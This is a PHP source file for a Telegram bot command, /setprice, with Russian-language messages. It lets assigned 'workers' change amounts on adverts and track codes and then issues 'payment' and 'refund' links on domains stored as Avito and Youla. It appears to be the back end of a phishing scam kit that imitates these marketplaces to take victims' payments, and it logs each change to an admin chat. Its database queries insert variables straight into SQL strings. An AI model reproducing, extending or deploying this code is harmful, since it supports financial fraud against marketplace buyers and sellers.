<?php

	if(preg_match('/^\/setprice/i', $message['text']) == TRUE) {
		if(preg_match('/^\/setprice ([0-9]+|[a-z0-9]{24});\d{3,5}$/i', $message['text']) == TRUE) {
			$edit = explode(';', mb_substr($message['text'], 10));
			
			if($edit[1] >= $settings['min_price'] AND $edit[1] <= $settings['max_price']) {
				$adverts = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]'");
				$trackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodes` WHERE `code` = '$edit[0]'");
				
				if(mysqli_num_rows($adverts) > 0 OR mysqli_num_rows($trackcodes) > 0) {
					if(mysqli_num_rows($adverts) > 0) {
						$advert = mysqli_fetch_assoc($adverts);
						
						if($advert['worker'] == $message['from']) {
							mysqli_query($connection, "UPDATE `adverts` SET `price` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");
							
							$text = "✍🏿 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил сумму объявления с</b> <code>$advert[price] руб.</code> <b>на</b> <code>$edit[1] руб.</code>\n";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							$text = "💶 <b>Вы изменили цену на объявлении с</b> <code>$advert[price] руб.</code> <b>до</b> <code>$edit[1] руб.</code>\n\n";
							
							if($advert['type'] == 0) {
								$text .= "<b>Оплата:</b> https://$domains[avito]/buy?id=$edit[0]\n";
								$text .= "<b>Возврат:</b> https://$domains[avito]/refund?id=$edit[0]";
							} elseif($advert['type'] == 1) {
								$text .= "<b>Оплата:</b> https://$domains[youla]/product/$edit[0]/buy/delivery\n";
								$text .= "<b>Возврат:</b> https://$domains[youla]/refund/$edit[0]/\n";
							}
						} else {
							$text = "📬 <b>Объявление закреплено не за вашим аккаунтом</b>";
						}
					} elseif(mysqli_num_rows($trackcodes) > 0) {
						$track = mysqli_fetch_assoc($trackcodes);
						
						if($track['worker'] == $message['from']) {
							if($track['status'] > 0) {
								mysqli_query($connection, "UPDATE `trackcodes` SET `amount` = '$edit[1]' WHERE `code` = '$edit[0]' AND `worker` = '$message[from]' AND `status` > '0'");
								
								$text = "✍🏿 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил сумму трек-кода с</b> <code>$track[amount] руб.</code> <b>на</b> <code>$edit[1] руб.</code>\n";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								$text = "💶 <b>Вы изменили цену на трек-коде с</b> <code>$track[amount] руб.</code> <b>до</b> <code>$edit[1] руб.</code>";
							} else {
								$text = "📬 <b>Трек-код ещё не обработан или уже неактивен</b>";
							}
						} else {
							$text = "📬 <b>Трек-код закреплен не за вашим аккаунтом</b>";
						}
					} else {
						$text = "📬 <b>Объявление или трек-код с таким ID не было найдено</b>";
					}
				} else {
					$text = "📬 <b>Объявление или трек-код с таким ID не было найдено</b>";
				}
			} else {
				$text = "🚫 <b>Сумма товара не может быть больше $settings[max_price] руб. и меньше $settings[min_price] руб.</b>";
			}
			
			send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		} else {
			$text = "❔ Используйте /setprice <code>[ID объявления];[Сумма товара]</code>";
			send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		}
	}

?>